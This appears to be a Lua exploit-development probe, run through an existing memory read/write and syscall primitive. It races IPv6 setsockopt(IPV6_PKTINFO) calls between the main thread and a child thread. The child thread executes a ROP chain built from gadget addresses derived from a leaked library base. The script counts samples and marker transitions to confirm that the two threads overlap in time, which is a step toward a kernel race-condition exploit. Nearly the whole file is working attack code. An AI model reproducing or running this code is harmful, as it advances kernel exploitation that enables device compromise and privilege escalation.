-- CRASH_CLASS: HIGH
-- PROBE 91f: IPv6 setsockopt race — overlap detection
--
-- 91d: 11K calls survived, marker=1 (both set PKTINFO).
-- 91e: R1 ok, R2+ crashed (chain build too heavy).
-- This: single round, 6548 child cycles, 50K main, sample every 100
-- to prove real temporal overlap. Then repeat with 2 more sockets.

print("=== PROBE 91f: IPv6 RACE OVERLAP ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO SA") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local tc=mk(430); local tk=mk(433); local mm=mk(477)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDX=uint64(string.format("0x%X%08X",ehi,elo+0x3B02D7))

local _DI=0x048;local _SI=0x050;local _DX=0x058
local _R8=0x068;local _R10=0x090;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

local PV6=41; local PKTINFO=46

local function alive(tid)
    if not tid or N(tid)==0 then return false end
    local ok,rv=pcall(function() return tk(tid,uint64(0)) end)
    return ok and N(rv)==0
end

-- ============================================================
-- Create 3 IPv6 sockets for 3 independent races
-- ============================================================
local sockets={}
for i=1,3 do
    local s=N(native.fcall_with_rax(stub,97,28,2,0))
    if s<=0 then print("socket "..i.." FAIL") break end
    sockets[i]=s
    -- enable PKTINFO
    local p=memory.alloc(20); z(p,20); wd(p,77)
    native.fcall_with_rax(stub,105,s,PV6,PKTINFO,N(p),20)
end
print(#sockets.." IPv6 sockets")
if #sockets==0 then print("BLOCKED") return end

-- ============================================================
-- Build ONE child ROP chain (reused per socket via RDI change)
-- ============================================================
local STSZ=0x40000
local ok_s,stk=pcall(function()
    return mm(uint64(0),uint64(STSZ),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_s then print("FAIL mmap") return end

local pi_c=memory.alloc(20); z(pi_c,20); wd(pi_c,2)

local off=0
local ncycles=math.floor((STSZ-200)/40)
for i=1,ncycles do
    wq(stk+off,PRDX); off=off+8
    wq(stk+off,uint64(PKTINFO)); off=off+8
    wq(stk+off,PRAX); off=off+8
    wq(stk+off,uint64(105)); off=off+8
    wq(stk+off,SA); off=off+8
end
local ts=memory.alloc(16); wq(ts,uint64(999)); wq(ts+8,uint64(0))
wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(N(ts))); off=off+8
wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
wq(stk+off,SA); off=off+8
print(ncycles.." child cycles")

-- ============================================================
-- Race each socket
-- ============================================================
local pi_m=memory.alloc(20); z(pi_m,20); wd(pi_m,1)
local gb=memory.alloc(32)
local gl=memory.alloc(4)

for si=1,#sockets do
    local s6=sockets[si]

    -- Reset marker to 77
    local p0=memory.alloc(20); z(p0,20); wd(p0,77)
    native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(p0),20)

    -- Spawn child thread for this socket
    local ctx=memory.alloc(0x200); z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(N(stk)))
    wq(ctx+_AX,uint64(105))
    wq(ctx+_DI,uint64(s6))
    wq(ctx+_SI,uint64(PV6))
    wq(ctx+_DX,uint64(PKTINFO))
    wq(ctx+_R10,uint64(N(pi_c)))
    wq(ctx+_R8,uint64(20))

    local tb=memory.alloc(8); wq(tb,uint64(0))
    local ok_t,rv_t=pcall(function() return tc(uint64(ctx),uint64(tb),uint64(0)) end)
    local tid=rq(tb)

    -- Race: main loop with marker sampling
    local m_ok,m_fail=0,0
    local c_seen=0
    local transitions=0
    local last_mk=77

    for i=1,50000 do
        local rv=N(native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(pi_m),20))
        if rv==0 then m_ok=m_ok+1 else m_fail=m_fail+1 end

        if i%100==0 then
            z(gb,32); wd(gl,20)
            local gv=N(native.fcall_with_rax(stub,118,s6,PV6,PKTINFO,N(gb),N(gl)))
            if gv==0 then
                local mk=rd(gb)
                if mk==2 then c_seen=c_seen+1 end
                if mk~=last_mk then transitions=transitions+1; last_mk=mk end
            end
        end
    end

    -- Final marker
    z(gb,32); wd(gl,20)
    native.fcall_with_rax(stub,118,s6,PV6,PKTINFO,N(gb),N(gl))
    local mk_end=rd(gb)
    local ca=alive(tid)

    print("S"..si.."(fd="..s6.."): ok="..m_ok.." fail="..m_fail
        .." c_seen="..c_seen.."/500"
        .." transitions="..transitions
        .." mk="..tostring(mk_end)
        .." alive="..tostring(ca))

    if c_seen>0 then
        print("  *** TEMPORAL OVERLAP CONFIRMED ***")
    end

    -- Kill child
    if tid and N(tid)>0 then pcall(function() tk(tid,uint64(9)) end) end
end

-- ============================================================
-- Cleanup
-- ============================================================
print("")
for _,s in ipairs(sockets) do native.fcall_with_rax(stub,6,s) end
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91f DONE ===")
